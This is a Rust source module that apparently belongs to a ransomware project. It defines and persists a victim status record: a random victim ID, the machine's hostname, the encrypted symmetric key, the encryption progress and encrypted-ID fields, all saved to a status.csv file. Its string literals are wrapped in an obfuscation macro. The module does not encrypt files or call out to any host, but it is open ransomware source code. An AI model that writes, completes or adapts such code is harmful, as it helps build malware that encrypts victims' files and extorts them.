use std::{
    fs::{self, File},
    io::ErrorKind,
    path::Path,
    sync::LazyLock,
};

use anyhow::{Context, bail};
use coconut_crab_lib::web::types::{EncryptedSymKey, VictimId};
use csv::{ReaderBuilder, WriterBuilder};
use rand::{RngExt, distr::Alphanumeric};
use serde::{Deserialize, Serialize};
use tracing::{debug, error, info};

#[derive(Serialize, Deserialize, Clone, Debug)]
pub struct Status {
    #[serde(default)]
    pub id: VictimId,
    #[serde(default)]
    pub hostname: String,
    #[serde(default)]
    pub asymmetrically_encrypted_symmetric_key: EncryptedSymKey,
    #[serde(default)]
    pub state: EncryptionState,
    #[serde(default)]
    pub symmetrically_encrypted_id: String,
    #[serde(default)]
    pub symmetrically_encrypted_id_nonce: String,
    #[serde(default)]
    pub symmetrically_encrypted_id_tag: String,
    #[serde(default)]
    pub encryption_aad: String,
}

#[derive(Serialize, Deserialize, Clone, Copy, Debug, Default, PartialEq, Eq)]
pub enum EncryptionState {
    #[default]
    NotStarted,
    Started,
    Complete,
}

impl EncryptionState {
    #[must_use]
    pub const fn is_started(self) -> bool {
        matches!(self, Self::Started)
    }

    #[must_use]
    pub const fn is_complete(self) -> bool {
        matches!(self, Self::Complete)
    }
}

pub static STATUS_FILENAME: LazyLock<String> = LazyLock::new(|| lc!("status.csv"));
pub static ANALYSIS_FILENAME: LazyLock<String> = LazyLock::new(|| lc!("analysis.txt"));

pub const ENCRYPTION_AAD: &str = "Cartier and Tiffany";

pub fn import_status_csv(path: &Path) -> anyhow::Result<Option<Status>> {
    let file = match File::open(path.join(&*STATUS_FILENAME)) {
        Ok(file) => {
            info!(?file, "Existing CSV file found");
            file
        }
        Err(error) if error.kind() == ErrorKind::NotFound => {
            info!(error = ?error, "Existing CSV file not found");
            return Ok(None);
        }
        Err(error) => return Err(error).context("failed to open status CSV"),
    };
    let mut reader = ReaderBuilder::new().has_headers(true).from_reader(file);
    let mut rows = reader.deserialize();
    let Some(row) = rows.next() else {
        bail!("status CSV exists but contains no records (truncated?)");
    };
    let status: Status = row.context("failed to parse status CSV row")?;
    if status.id.as_str().is_empty() {
        bail!("status CSV record has no victim ID (corrupt or foreign file)");
    }
    debug!(?status, "Successfully parsed row to status");
    if rows.next().is_some() {
        bail!("status CSV contains more than one record");
    }
    Ok(Some(status))
}

pub fn export_status_csv(path: &Path, status: &Status) -> anyhow::Result<()> {
    let status_file_path = path.join(&*STATUS_FILENAME);
    let temp_file_path = path.join(format!("{}.tmp", *STATUS_FILENAME));

    let file = File::create(&temp_file_path).context("failed to create temporary status CSV")?;
    let mut writer = WriterBuilder::new().has_headers(true).from_writer(file);
    writer
        .serialize(status)
        .context("failed to serialize status to CSV")?;
    let file = writer.into_inner().context("failed to flush status CSV")?;
    file.sync_all().context("failed to sync status CSV")?;
    drop(file);
    fs::rename(&temp_file_path, &status_file_path).context("failed to replace status CSV")?;
    Ok(())
}

pub fn create_status() -> Status {
    let status = Status {
        id: VictimId::new(generate_id()),
        hostname: current_hostname(),
        asymmetrically_encrypted_symmetric_key: EncryptedSymKey::new(String::new()),
        state: EncryptionState::NotStarted,
        symmetrically_encrypted_id: String::new(),
        symmetrically_encrypted_id_nonce: String::new(),
        symmetrically_encrypted_id_tag: String::new(),
        encryption_aad: String::from(ENCRYPTION_AAD),
    };
    debug!(?status, "Created new status");
    status
}

fn sanitize_hostname(raw: &str) -> Option<String> {
    let cleaned: String = raw
        .chars()
        .take(32)
        .map(|character| {
            if character.is_ascii_alphanumeric() || character == '.' || character == '-' {
                character
            } else {
                '-'
            }
        })
        .collect();
    (!cleaned.is_empty()).then_some(cleaned)
}

fn current_hostname() -> String {
    const FALLBACK: &str = "HostnameError";
    let raw = match hostname::get() {
        Ok(name) => {
            debug!(name = %name.display(), "Got hostname");
            name.to_string_lossy().into_owned()
        }
        Err(error) => {
            error!(error = ?error, "Failed to get hostname");
            return String::from(FALLBACK);
        }
    };
    sanitize_hostname(&raw).unwrap_or_else(|| String::from(FALLBACK))
}

fn generate_id() -> String {
    rand::rng()
        .sample_iter(&Alphanumeric)
        .take(16)
        .map(char::from)
        .collect()
}
